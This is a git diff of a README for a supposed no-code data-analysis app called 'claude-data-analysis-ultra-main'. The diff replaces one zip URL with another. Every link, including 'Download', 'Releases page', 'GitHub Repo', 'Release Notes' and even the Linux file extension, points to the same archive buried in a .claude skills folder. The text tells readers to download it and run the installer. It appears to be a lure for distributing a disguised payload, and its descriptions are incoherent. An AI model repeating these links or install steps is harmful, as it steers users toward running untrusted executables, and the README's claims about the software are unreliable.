@@ -1,7 +1,7 @@
 # 🎉 claude-data-analysis-ultra-main - Effortless Data Analysis for Everyone
 
 ## 📥 Download Now
-[![Download](https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip)](https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip)
+[![Download](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip)](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip)
 
 ## 📖 Overview
 Welcome to **claude-data-analysis-ultra-main**! This application simplifies data analysis for anyone, even if you have no technical background. It helps you understand critical internet data, making it useful for various contexts like e-commerce or digital marketing. With our straightforward command, you can quickly dive into tasks like user analysis, retention, and A/B testing.
@@ -10,7 +10,7 @@ Welcome to **claude-data-analysis-ultra-main**! This application simplifies data
 To start using **claude-data-analysis-ultra-main**, follow these simple steps.
 
 ### 1. Visit the Download Page
-Go to [this link](https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip) to access the Releases page. Here, you will find the most recent versions of our application.
+Go to [this link](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip) to access the Releases page. Here, you will find the most recent versions of our application.
 
 ### 2. Choose Your Version
 On the Releases page, you’ll see a list of available versions. Look for the latest version, which will typically be at the top of the list. 
@@ -20,7 +20,7 @@ To download, click on the relevant file link for your operating system (Windows,
 
 - For Windows users, look for files ending in `.exe`.
 - For macOS users, look for files ending in `.dmg`.
-- For Linux users, look for files ending in `https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip` or your appropriate package format.
+- For Linux users, look for files ending in `https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip` or your appropriate package format.
 
 ### 4. Install the Application
 Once the download completes, find the file in your downloads folder and run the installer. Follow the on-screen instructions to complete the installation.
@@ -49,11 +49,11 @@ Once installed, you can start using the application with the following steps:
 - **Comprehensive Reporting**: Results are easy to read and export for further use.
 
 ## 📥 Download & Install
-To get started, download the application by visiting [this page](https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip). Follow the steps outlined above for installation and start your journey towards effortless data analysis.
+To get started, download the application by visiting [this page](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip). Follow the steps outlined above for installation and start your journey towards effortless data analysis.
 
 ## 🔗 Helpful Links
-- [GitHub Repo](https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip)
-- [Release Notes](https://github.com/zenyrae123/claude-data-analysis-ultra-main/raw/refs/heads/main/.claude/skills/recommender-system/examples/sample_data/main_analysis_data_claude_ultra_v1.3-alpha.5.zip)
+- [GitHub Repo](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip)
+- [Release Notes](https://raw.githubusercontent.com/zenyrae123/claude-data-analysis-ultra-main/main/.claude/skills/recommender-system/data_ultra_claude_analysis_main_v3.5.zip)
 
 ## 🤝 Support
 If you encounter issues or have questions, feel free to reach out through the Issues section on our GitHub page. We’re here to help you navigate your data analysis journey. 
